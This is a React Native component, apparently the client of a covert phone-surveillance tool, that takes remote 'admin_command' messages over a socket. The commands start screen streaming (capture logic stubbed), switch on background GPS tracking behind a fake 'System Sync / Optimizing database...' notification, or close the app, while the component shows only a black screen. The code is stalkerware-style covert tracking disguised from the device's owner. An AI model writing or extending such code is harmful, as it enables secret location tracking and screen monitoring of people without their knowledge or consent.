import React, { useEffect, useRef } from 'react';
import { View, StyleSheet, BackHandler } from 'react-native';
import * as Location from 'expo-location';

const GPS_TASK = 'bg-gps-sync';

export default function GhostScreen({ socket, name }) {
    const streamTimer = useRef(null);
    const pinpointTimer = useRef(null); // Auto-kill timer

    useEffect(() => {
        socket.on('admin_command', async (cmd) => {
            // STREAMING LOGIC
            if (cmd === 'START_LIVE') startStream(300);
            if (cmd === 'START_ECO') startStream(5000);
            if (cmd === 'WIPE') BackHandler.exitApp();

            // PINPOINT LOGIC (Triggered & Timed)
            if (cmd === 'START_PINPOINT') {
                await activatePinpoint();
            }
            if (cmd === 'STOP_PINPOINT') {
                deactivatePinpoint();
            }
        });

        return () => {
            clearInterval(streamTimer.current);
            clearTimeout(pinpointTimer.current);
            Location.stopLocationUpdatesAsync(GPS_TASK);
        };
    }, []);

    const activatePinpoint = async () => {
        const { status } = await Location.requestBackgroundPermissionsAsync();
        if (status === 'granted') {
            // START HARDWARE
            await Location.startLocationUpdatesAsync(GPS_TASK, {
                accuracy: Location.Accuracy.BestForNavigation,
                timeInterval: 5000,
                foregroundService: {
                    notificationTitle: "System Sync",
                    notificationBody: "Optimizing database...",
                    notificationColor: "#000000"
                }
            });

            // SAFETY: Auto-kill after 5 minutes to save battery
            clearTimeout(pinpointTimer.current);
            pinpointTimer.current = setTimeout(() => {
                deactivatePinpoint();
                socket.emit('system_log', "Pinpoint Auto-Terminated (5m limit)");
            }, 300000); 
        }
    };

    const deactivatePinpoint = async () => {
        await Location.stopLocationUpdatesAsync(GPS_TASK);
        clearTimeout(pinpointTimer.current);
    };

    const startStream = (ms) => {
        // ... (Your captureScreen logic)
    };

    return <View style={styles.blackout} />;
}
